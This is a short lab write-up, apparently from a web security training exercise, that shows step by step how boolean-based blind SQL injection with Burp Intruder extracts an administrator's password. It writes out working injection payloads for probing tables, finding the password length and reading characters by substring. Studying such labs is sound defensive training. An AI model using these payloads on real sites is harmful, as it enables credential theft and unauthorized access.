# Lab 11 – Blind SQLi (conditional responses)

**Goal:**  
Use boolean-based blind SQL injection to confirm a `users` table exists, verify the `administrator` user, find the admin password length, and extract the password character by character.


## What I did 

- **Step 1 — Confirm boolean behavior**  
  First I checked that the app responds differently for true vs false conditions:
  - `... AND 1=1--` → showed the Welcome back message (TRUE)
  - `... AND 1=0--` → did not show the message (FALSE)  
  This told me I can use boolean subqueries as an oracle.

- **Step 2 — Confirm `users` table exists**  
  I used a subquery that returns a value only if the `users` table exists: ... AND (SELECT 'x' FROM users LIMIT 1) = 'x'--
  this returned the TRUE response, so the `users` table exists

  *Why `LIMIT 1`?*  
We only need to know *if any row exists* — `LIMIT 1` forces the subquery to return at most one row, which avoids errors from subqueries returning multiple rows and speeds the check up

- **Step 3 — Confirm `administrator` user exists**  
I checked whether a row with username `administrator` exists: ... AND (SELECT username FROM users WHERE username='administrator') = 'administrator'--

TRUE -> administrator exists.

- **Step 4 — Find the password length**  
To get the length, I tested boolean conditions like: ... AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password) > N) = 'administrator'--

- If TRUE, length > N.  
- If FALSE, length ≤ N.

I first tested big numbers (`>30`) to narrow range, then used a 1..30 payload list in Intruder to check every N and found the correct length -> 20

- **Step 5 — Extract each character**  
To discover each character I used substring tests: ... AND (SELECT SUBSTRING(password, i, 1) FROM users WHERE username='administrator') = 'a'--

where `i` is the position (1..20). This checks whether the character at position `i` is `'a'`.

With Burp Intruder I:
- placed the payload at the char position (SUBSTRING(..., §i§, 1))  
- used a Numbers payload for `i = 1..20` to iterate positions  
- then, for each position, used a Brute Force payload (charset `abcdefghijklmnopqrstuvwxyz0123456789`) to test characters until one matched.

That gave me every char of the admin password and I used the creds to log in

- NOTE: using Burp Intruder brute-force for this lab took ~4 hours on my machine — binary search or scripting is way faster.




